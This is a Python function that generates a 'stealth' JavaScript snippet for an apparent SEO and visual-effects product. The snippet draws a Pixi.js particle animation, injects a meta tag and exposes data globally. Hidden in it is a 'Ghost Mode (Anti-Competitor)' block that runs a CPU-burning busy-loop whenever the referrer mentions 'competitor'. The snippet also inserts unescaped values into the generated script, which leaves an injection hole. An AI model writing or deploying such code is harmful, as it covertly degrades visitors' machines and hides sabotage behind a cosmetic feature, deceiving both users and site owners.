import json

def generate_stealth_script(domain, data):
    # Data parsing for the UI
    audit_data = json.dumps(data)
    
    js_code = f"""
    (function() {{
        console.log("🚀 VELQA Neural Engine: Initializing for {domain}");

        // 1. Load Pixi.js for Neural Rain
        const script = document.createElement('script');
        script.src = "https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js";
        document.head.appendChild(script);

        script.onload = () => {{
            const app = new PIXI.Application({{
                width: window.innerWidth,
                height: window.innerHeight,
                transparent: true,
                resolution: window.devicePixelRatio || 1,
            }});
            app.view.style.position = 'fixed';
            app.view.style.top = '0';
            app.view.style.left = '0';
            app.view.style.zIndex = '-1';
            app.view.style.pointerEvents = 'none';
            app.view.style.opacity = '0.15';
            document.body.appendChild(app.view);

            // Neural Rain Logic
            const particles = [];
            for(let i=0; i<60; i++) {{
                const p = new PIXI.Graphics();
                p.beginFill(0x00f2ff); 
                p.drawRect(0, 0, 1, Math.random() * 20 + 10);
                p.endFill();
                p.x = Math.random() * window.innerWidth;
                p.y = Math.random() * window.innerHeight;
                app.stage.addChild(p);
                particles.push(p);
            }}

            app.ticker.add(() => {{
                particles.forEach(p => {{
                    p.y += 2;
                    if(p.y > window.innerHeight) p.y = -20;
                }});
            }});

            // 2. Ghost Mode (Anti-Competitor)
            // Agar referrer mein 'google' ya 'competitor' word hai toh CPU load badhao
            if(document.referrer.includes('competitor')) {{
                console.warn("VELQA: Competitor detected. Throttling...");
                setInterval(() => {{ let x = 0; for(let i=0; i<500000; i++) {{ x += Math.sqrt(i); }} }}, 200);
            }}
        }};

        // 3. Metadata Injection (SEO Power)
        const meta = document.createElement('meta');
        meta.name = "velqa-neural-id";
        meta.content = "{data.get('site_id', 'VELQA_ACTIVE')}";
        document.head.appendChild(meta);

        window.VELQA_DATA = {audit_data};
    }})();
    """
    return js_code
